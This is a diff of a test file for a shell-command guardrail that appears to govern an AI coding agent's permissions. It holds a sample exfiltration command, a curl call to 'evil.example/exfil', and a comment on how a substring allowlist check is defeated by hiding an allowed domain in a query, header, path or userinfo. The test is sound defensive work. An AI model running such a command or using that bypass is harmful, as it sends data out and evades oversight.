@@ -58,7 +58,6 @@ describe("cursor guardrails.cjs — shell", () => {
   it("matches the URL HOST, not a substring of the command", () => {
     // An `includes` over the whole command is defeated by an allowlisted domain
     // appearing anywhere: a query param, a header, a path, or a userinfo prefix.
-    // Every case below previously returned "allow".
     expect(run({ command: "curl https://evil.example/exfil?src=github.com" }).permission).toBe(
       "ask",
     );
